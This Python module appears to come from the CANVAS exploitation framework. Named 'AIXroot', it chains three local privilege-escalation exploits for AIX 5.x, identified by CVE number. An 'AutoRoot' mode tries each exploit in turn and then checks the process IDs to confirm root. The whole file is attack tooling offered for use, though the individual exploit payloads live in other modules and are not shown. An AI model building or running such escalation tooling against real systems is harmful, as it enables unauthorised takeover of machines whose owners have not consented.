#!/usr/bin/env python

# AIXroot is a multiheaded (HYDRA!?) local root gettermathingabob for AIX 5.x

import sys
import os

if '.' not in sys.path:
    sys.path.append('.')

from canvasexploit import canvasexploit
from canvasengine import getModuleExploitClass
from exploitutils import *
from ExploitTypes.localexploit import LocalExploit

NAME                = 'AIXroot'
VERSION             = '1.0'
DESCRIPTION         = 'Local privilege escalation for AIX 5.x'
DOCUMENTATION       = {}

PROPERTY            = {}
PROPERTY['TYPE']    = 'Exploit'
PROPERTY['SITE']    = 'Local'
PROPERTY['ARCH']    = [ ['AIX', 'powerpc'] ]
PROPERTY['VERSION'] = [ '5.X' ]

GUI_VERSIONS        = {}
GUI_VERSIONS[0]     = 'AutoRoot'
GUI_VERSIONS[1]     = 'CVE_2007_4003'
GUI_VERSIONS[2]     = 'CVE_2007_4513'
GUI_VERSIONS[3]     = 'CVE_2004_1329'

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        
        self.AIXlocals                  = {}
        self.AIXlocals['CVE_2007_4003'] = getModuleExploitClass('CVE_2007_4003', which='CVE_2007_4003')
        self.AIXlocals['CVE_2007_4513'] = getModuleExploitClass('CVE_2007_4513', which='CVE_2007_4513')
        self.AIXlocals['CVE_2004_1329'] = getModuleExploitClass('CVE_2004_1329', which='CVE_2004_1329')
        self.CVE                        = None
        self.name                       = NAME
        
    def show_available(self):
        for local in self.AIXlocals:
            self.log('available: %s' % local)
        return

    def getargs(self):
        self.CVE    = self.argsDict.get('CVE', self.CVE)
        self.node   = self.argsDict['passednodes'][0]
        if not self.CVE:
            self.CVE = GUI_VERSIONS[self.version]
            self.log('selected exploit for %s' % self.CVE)
        return
    
    def run(self):
        self.setInfo('%s - (in progress)' % NAME)

        self.getargs()
        ret = False
        if self.CVE in self.AIXlocals:
            self.setInfo('%s - (%s)' % (NAME, self.CVE))
            # this returns elevated node on success, false on Failure
            ret = self.AIXlocals[self.CVE](self, self.node.shell.version).exploit(self.node)
            if ret not in [False, None]:
                # init a new node with same SSid
                ret.shell.started = False
                ret.shell.startup()
                self.log("Done .. check your UID!")
        # auto root
        elif self.CVE == 'AutoRoot':
            self.setInfo('%s - (%s)' % (NAME, self.CVE))
            for self.CVE in self.AIXlocals:
                ret = self.AIXlocals[self.CVE](self, self.node.shell.version).exploit(self.node)
                if ret not in [False, None]:
                    ret.shell.started = False
                    ret.shell.startup()
                    self.log('Checking privileges on node...')
                    uid,euid,gid,egid = self.node.shell.ids()
                    if not uid or not euid or not gid or not egid:
                        self.log('Got root!')
                        break     
                
        self.setInfo('%s - (finished)' % NAME)
        return ret
    
if __name__ == '__main__':
    'This module is meant to be run only within CANVAS'        
        
        
